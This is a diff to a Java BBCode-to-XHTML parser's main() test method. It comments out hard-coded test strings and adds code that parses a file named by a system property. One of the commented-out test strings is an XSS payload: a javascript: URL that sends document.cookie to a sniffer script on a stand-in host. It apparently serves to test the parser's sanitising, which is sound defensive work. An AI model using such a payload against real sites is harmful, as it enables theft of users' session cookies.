@@ -1,7 +1,6 @@
 package ru.org.bbcode;
 
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
+import java.io.*;
 
 /**
  * Created by IntelliJ IDEA.
@@ -37,7 +36,7 @@ public class ParserUtil {
     public static void main(String[] args) throws Exception{
         BufferedReader console = new BufferedReader(new InputStreamReader(System.in));
 
-        String test_paragraph = "test\ntest\n\ntest";
+/*        String test_paragraph = "test\ntest\n\ntest";
         System.out.println(bb2xhtml(test_paragraph, false));
 
         String test_xss_url = "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]";
@@ -65,7 +64,20 @@ public class ParserUtil {
         System.out.println(bb2xhtml(test_cut2, false, true, "/msg"));
         System.out.println(bb2xhtml(test_cut2, false, false, "/msg"));
 
+        String test_list = "[list][*]1[*]2[list][*]1[*]2[/list][/list]";
+        System.out.println(bb2xhtml(test_list, false, true, "/msg")); */
 
+        String filename = System.getProperty("filename");
+        System.err.println("Parse "+filename);
+        BufferedReader in = new BufferedReader(new InputStreamReader(new FileInputStream(filename), "UTF8"));
+        StringBuilder builder = new StringBuilder();
+        String s;
+        while( (s = in.readLine()) != null) {
+            System.err.println("read>"+s);
+            builder.append(s).append('\n');
+        }
+
+        System.out.println(bb2xhtml(builder.toString(), false, true, "/msg"));
 
 
 
